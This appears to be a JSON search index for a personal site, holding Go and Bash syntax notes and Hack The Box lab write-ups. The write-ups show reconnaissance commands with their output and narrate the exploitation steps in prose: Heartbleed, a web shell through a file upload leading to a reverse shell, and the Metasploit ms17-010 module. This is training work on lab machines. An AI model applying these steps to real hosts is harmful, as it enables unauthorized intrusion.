[{"categories":null,"contents":" Hello World A sample go program is show here.\npackage main import \u0026#34;fmt\u0026#34; func main() { message := greetMe(\u0026#34;world\u0026#34;) fmt.Println(message) } func greetMe(name string) string { return \u0026#34;Hello, \u0026#34; + name + \u0026#34;!\u0026#34; } Run the program as below:\n$ go run hello.go Variables Normal Declaration:\nvar msg string msg = \u0026#34;Hello\u0026#34; Shortcut:\nmsg := \u0026#34;Hello\u0026#34; Constants const Phi = 1.618 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/introduction/","summary":" Hello World A sample go program is show here.\npackage main import \u0026#34;fmt\u0026#34; func main() { message := greetMe(\u0026#34;world\u0026#34;) fmt.Println(message) } func greetMe(name string) string { return \u0026#34;Hello, \u0026#34; + name + \u0026#34;!\u0026#34; } Run the program as below:\n$ go run hello.go Variables Normal Declaration:\nvar msg string msg = \u0026#34;Hello\u0026#34; Shortcut:\nmsg := \u0026#34;Hello\u0026#34; Constants const Phi = 1.618 ","tags":null,"title":"Introduction"},{"categories":null,"contents":" Strings str := \u0026#34;Hello\u0026#34; Multiline string\nstr := `Multiline string` Numbers Typical types\nnum := 3 // int num := 3. // float64 num := 3 + 4i // complex128 num := byte(\u0026#39;a\u0026#39;) // byte (alias for uint8) Other Types\nvar u uint = 7 // uint (unsigned) var p float32 = 22.7 // 32-bit float Arrays // var numbers [5]int numbers := [...]int{0, 0, 0, 0, 0} Pointers func main () { b := *getPointer() fmt.Println(\u0026#34;Value is\u0026#34;, b) func getPointer () (myPointer *int) { a := 234 return \u0026amp;a a := new(int) *a = 234 Pointers point to a memory location of a variable. Go is fully garbage-collected.\nType Conversion i := 2 f := float64(i) u := uint(i) Slice slice := []int{2, 3, 4} slice := []byte(\u0026#34;Hello\u0026#34;) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/types/","summary":"Strings str := \u0026#34;Hello\u0026#34; Multiline string\nstr := `Multiline string` Numbers Typical types\nnum := 3 // int num := 3. // float64 num := 3 + 4i // complex128 num := byte(\u0026#39;a\u0026#39;) // byte (alias for uint8) Other Types\nvar u uint = 7 // uint (unsigned) var p float32 = 22.7 // 32-bit float Arrays // var numbers [5]int numbers := [...]int{0, 0, 0, 0, 0} Pointers func main () { b := *getPointer() fmt.","tags":null,"title":"Basic Types"},{"categories":null,"contents":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) Switch switch day { case \u0026#34;sunday\u0026#34;: // cases don\u0026#39;t \u0026#34;fall through\u0026#34; by default! fallthrough case \u0026#34;saturday\u0026#34;: rest() default: work() } Loop for count := 0; count \u0026lt;= 10; count++ { fmt.Println(\u0026#34;My counter is at\u0026#34;, count) } entry := []string{\u0026#34;Jack\u0026#34;,\u0026#34;John\u0026#34;,\u0026#34;Jones\u0026#34;} for i, val := range entry { fmt.Printf(\u0026#34;At position %d, the character %s is present\\n\u0026#34;, i, val) n := 0 x := 42 for n != x { n := guess() } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/flow-control/","summary":"Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) Switch switch day { case \u0026#34;sunday\u0026#34;: // cases don\u0026#39;t \u0026#34;fall through\u0026#34; by default! fallthrough case \u0026#34;saturday\u0026#34;: rest() default: work() } Loop for count := 0; count \u0026lt;= 10; count++ { fmt.Println(\u0026#34;My counter is at\u0026#34;, count) } entry := []string{\u0026#34;Jack\u0026#34;,\u0026#34;John\u0026#34;,\u0026#34;Jones\u0026#34;} for i, val := range entry { fmt.","tags":null,"title":"Flow Control"},{"categories":null,"contents":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/advanced/files/","summary":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) ","tags":null,"title":"File Manipulation"},{"categories":null,"contents":" Variable NAME=\u0026#34;John\u0026#34; echo $NAME echo \u0026#34;$NAME\u0026#34; echo \u0026#34;${NAME} Condition if [[ -z \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is empty\u0026#34; elif [[ -n \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is not empty\u0026#34; fi ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/bash/basic/","summary":" Variable NAME=\u0026#34;John\u0026#34; echo $NAME echo \u0026#34;$NAME\u0026#34; echo \u0026#34;${NAME} Condition if [[ -z \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is empty\u0026#34; elif [[ -n \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is not empty\u0026#34; fi ","tags":null,"title":"Bash Variables"},{"categories":null,"contents":"Bashed ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bashed/images/bashed.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bashed/","summary":"Bashed ","tags":["HTB"],"title":"[HTB] Machine: Bashed"},{"categories":null,"contents":"Nibbles ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/nibbles/images/nibbles.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/nibbles/","summary":"Nibbles ","tags":["HTB"],"title":"[HTB] Machine: Nibbles"},{"categories":null,"contents":"Sense ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/sense/images/sense.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/sense/","summary":"Sense ","tags":["HTB"],"title":"[HTB] Machine: Sense"},{"categories":null,"contents":"Shocker ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/shocker/images/shocker.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/shocker/","summary":"Shocker ","tags":["HTB"],"title":"[HTB] Machine: Shocker"},{"categories":null,"contents":"Valentine Enumeration nmap └─$ nmap -sC -sV 10.10.10.79 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 19:16 BST Nmap scan report for 10.10.10.79 (10.10.10.79) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 964c51423cba2249204d3eec90ccfd0e (DSA) | 2048 46bf1fcc924f1da042b3d216a8583133 (RSA) |_ 256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) |_http-server-header: Apache/2.2.22 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US | Not valid before: 2018-02-06T00:45:25 |_Not valid after: 2019-02-06T00:45:25 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.2.22 (Ubuntu) |_ssl-date: 2023-06-07T18:16:21+00:00; -29s from scanner time. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: -29s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.31 seconds gobuster └─$ gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.79 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/07 20:00:19 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 38] /index (Status: 200) [Size: 38] /dev (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.79/dev/] /encode (Status: 200) [Size: 554] /encode.php (Status: 200) [Size: 554] /decode.php (Status: 200) [Size: 552] /decode (Status: 200) [Size: 552] Foothold/User Both web server host same image and look identical The picture suggests heartbleed So googling resulted: https://heartbleed.com/ https://xkcd.com/1354/ etc. Let\u0026rsquo;s search for exploit Test the exploit We see that it\u0026rsquo;s vulnerable Let\u0026rsquo;s remove zeros from output Now we need to dump the memory Found a script ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/valentine/images/valentine.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/valentine/","summary":"Valentine Enumeration nmap └─$ nmap -sC -sV 10.10.10.79 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 19:16 BST Nmap scan report for 10.10.10.79 (10.10.10.79) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 964c51423cba2249204d3eec90ccfd0e (DSA) | 2048 46bf1fcc924f1da042b3d216a8583133 (RSA) |_ 256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Valentine"},{"categories":null,"contents":"Bank Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.29 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 16:18 BST Nmap scan report for 10.10.10.29 (10.10.10.29) Host is up (0.12s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08eed030d545e459db4d54a8dc5cef15 (DSA) | 2048 b8e015482d0df0f17333b78164084a91 (RSA) | 256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA) |_ 256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519) 53/tcp open domain ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.01 seconds dig ┌──(kali㉿kali)-[~] └─$ dig AXFR bank.htb @10.10.10.29 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.12-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; AXFR bank.htb @10.10.10.29 ;; global options: +cmd bank.htb. 604800 IN SOA bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800 bank.htb. 604800 IN NS ns.bank.htb. bank.htb. 604800 IN A 10.10.10.29 ns.bank.htb. 604800 IN A 10.10.10.29 www.bank.htb. 604800 IN CNAME bank.htb. bank.htb. 604800 IN SOA bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800 ;; Query time: 231 msec ;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP) ;; WHEN: Tue Jun 06 16:43:22 BST 2023 ;; XFR size: 6 records (messages 1, bytes 171) After adding records to /etc/hosts └─$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 16:46:01 Starting gobuster in directory enumeration mode =============================================================== /login.php (Status: 200) [Size: 1974] /index.php (Status: 302) [Size: 7322] [--\u0026gt; login.php] /logout.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /.htaccess (Status: 403) [Size: 284] /. (Status: 302) [Size: 7322] [--\u0026gt; login.php] /.html (Status: 403) [Size: 280] /support.php (Status: 302) [Size: 3291] [--\u0026gt; login.php] /.php (Status: 403) [Size: 279] /.htpasswd (Status: 403) [Size: 284] /.htm (Status: 403) [Size: 279] /.htpasswds (Status: 403) [Size: 285] /.htgroup (Status: 403) [Size: 283] /wp-forum.phps (Status: 403) [Size: 288] /.htaccess.bak (Status: 403) [Size: 288] /.htuser (Status: 403) [Size: 282] /.ht (Status: 403) [Size: 278] /.htc (Status: 403) [Size: 279] /dispatch.fcgi (Status: 403) [Size: 288] /mytias.fcgi (Status: 403) [Size: 286] /test.fcgi (Status: 403) [Size: 284] Progress: 16243 / 16245 (99.99%) └─$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 16:49:19 Starting gobuster in directory enumeration mode =============================================================== /inc (Status: 301) [Size: 301] [--\u0026gt; http://bank.htb/inc/] /uploads (Status: 301) [Size: 305] [--\u0026gt; http://bank.htb/uploads/] /assets (Status: 301) [Size: 304] [--\u0026gt; http://bank.htb/assets/] /server-status (Status: 403) [Size: 288] gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bank.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 17:16:22 Starting gobuster in directory enumeration mode =============================================================== /uploads (Status: 301) [Size: 305] [--\u0026gt; http://bank.htb/uploads/] /assets (Status: 301) [Size: 304] [--\u0026gt; http://bank.htb/assets/] /inc (Status: 301) [Size: 301] [--\u0026gt; http://bank.htb/inc/] /server-status (Status: 403) [Size: 288] /balance-transfer (Status: 301) [Size: 314] [--\u0026gt; http://bank.htb/balance-transfer/] Progress: 220431 / 220561 (99.94%) Web server Let\u0026rsquo;s check inc edpoint from gobuster results Let\u0026rsquo;s launch Burp Suite We see strange response when accessing / path We recieve a big redirect response Foothold/User Let\u0026rsquo;s check balance-transfer endpoint We see bunch of transaction files Let\u0026rsquo;s curl and parse the results We see that majority of files have almost identical sizes except one Let\u0026rsquo;s check it We have credentials Use them to login to web server While checking the server, we notice that there is a support page with upload ticket option Let\u0026rsquo;s try file upload attack Check the request in Burp Suite I was trying manipulating Content-Type, adding magic byte, changing file extensions Then I noticed the comment Change extension to htb We were able to upload the file and now we have web-shell Let\u0026rsquo;s launch reverse-shell Root Basic privilege escalation routine Check sudo rights Check suid files etc. or use linpeas like tools We notice strange file named emergency Launch it Boom, we rooted the box Different approach There is a different approach to gain a foothold We saw that we receive a full page, but with response headers 301 or 302 status codes We can set Burp Suite proxy settings to Match and Replace those codes to 200 OK And we will simply open the page without any redirection ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bank/images/bank.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bank/","summary":"Bank Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.29 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 16:18 BST Nmap scan report for 10.10.10.29 (10.10.10.29) Host is up (0.12s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08eed030d545e459db4d54a8dc5cef15 (DSA) | 2048 b8e015482d0df0f17333b78164084a91 (RSA) | 256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA) |_ 256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519) 53/tcp open domain ISC BIND 9.","tags":["HTB"],"title":"[HTB] Machine: Bank"},{"categories":null,"contents":"Blocky Enumeration nmap └─$ nmap -sC -sV 10.10.10.37 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 18:28 BST Nmap scan report for 10.10.10.37 (10.10.10.37) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA) | 256 5d7f389570c9beac67a01e86e7978403 (ECDSA) |_ 256 09d5c204951a90ef87562597df837067 (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Did not follow redirect to http://blocky.htb 8192/tcp closed sophos Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.02 seconds Start gobuster └─$ gobuster dir -u http://blocky.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://blocky.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/06 18:34:46 Starting gobuster in directory enumeration mode =============================================================== /wiki (Status: 301) [Size: 307] [--\u0026gt; http://blocky.htb/wiki/] /wp-content (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/wp-content/] /plugins (Status: 301) [Size: 310] [--\u0026gt; http://blocky.htb/plugins/] /wp-includes (Status: 301) [Size: 314] [--\u0026gt; http://blocky.htb/wp-includes/] /javascript (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/javascript/] /wp-admin (Status: 301) [Size: 311] [--\u0026gt; http://blocky.htb/wp-admin/] /phpmyadmin (Status: 301) [Size: 313] [--\u0026gt; http://blocky.htb/phpmyadmin/] /server-status (Status: 403) [Size: 298] Progress: 220560 / 220561 (100.00%) We see wp-admin, so launch wpscan and enumerate Wordpress └─$ wpscan -e --url http://blocky.htb _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://blocky.htb/ [10.10.10.37] [+] Started: Tue Jun 6 18:43:45 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://blocky.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08). | Found By: Rss Generator (Passive Detection) | - http://blocky.htb/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8\u0026lt;/generator\u0026gt; | - http://blocky.htb/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://blocky.htb/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:22 \u0026lt;============================================================================================================================================================\u0026gt; (494 / 494) 100.00% Time: 00:00:22 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:01:44 \u0026lt;==========================================================================================================================================================\u0026gt; (2575 / 2575) 100.00% Time: 00:01:44 [i] No Timthumbs Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:05 \u0026lt;=============================================================================================================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:05 [i] No Config Backups Found. [+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:02 \u0026lt;===================================================================================================================================================================\u0026gt; (71 / 71) 100.00% Time: 00:00:02 [i] No DB Exports Found. [+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to \u0026#34;Plain\u0026#34; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:04 \u0026lt;========================================================================================================================================================\u0026gt; (100 / 100) 100.00% Time: 00:00:04 [i] No Medias Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Tue Jun 6 18:46:16 2023 [+] Requests Done: 3436 [+] Cached Requests: 10 [+] Data Sent: 922.433 KB [+] Data Received: 1.008 MB [+] Memory used: 285.152 MB [+] Elapsed time: 00:02:30 Check phpmyadmin endpoint Foothold/User Check plugins endpoint We see 2 files Download them They have jar extension Upload them jd-gui We retrieve password Try with a notch user that we enumerated with wpscan Success Root Check sudo rights Full sudo access ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/blocky/images/blocky.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/blocky/","summary":"Blocky Enumeration nmap └─$ nmap -sC -sV 10.10.10.37 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 18:28 BST Nmap scan report for 10.10.10.37 (10.10.10.37) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA) | 256 5d7f389570c9beac67a01e86e7978403 (ECDSA) |_ 256 09d5c204951a90ef87562597df837067 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Blocky"},{"categories":null,"contents":"Blue Enumeration nmap └─$ nmap -sC -sV 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:32 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.17s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-06T19:33:22 |_ start_date: 2023-06-06T19:27:47 | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-06-06T20:33:23+01:00 |_clock-skew: mean: -20m25s, deviation: 34m35s, median: -27s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.84 seconds nmap scripts └─$ nmap -Pn -p135,139,445 --script *vuln* 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:37 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.22s latency). PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND |_smb-vuln-ms10-054: false | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds Right away we see that the box is vulnerable to ms17-010 Foothold/User/Root Launch metasploit Search for ms17_010 Set options And launch the attack Wait for exploit to finish Grab your flags ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/blue/images/blue.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/blue/","summary":"Blue Enumeration nmap └─$ nmap -sC -sV 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:32 BST Nmap scan report for 10.10.10.40 (10.10.10.40) Host is up (0.17s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE 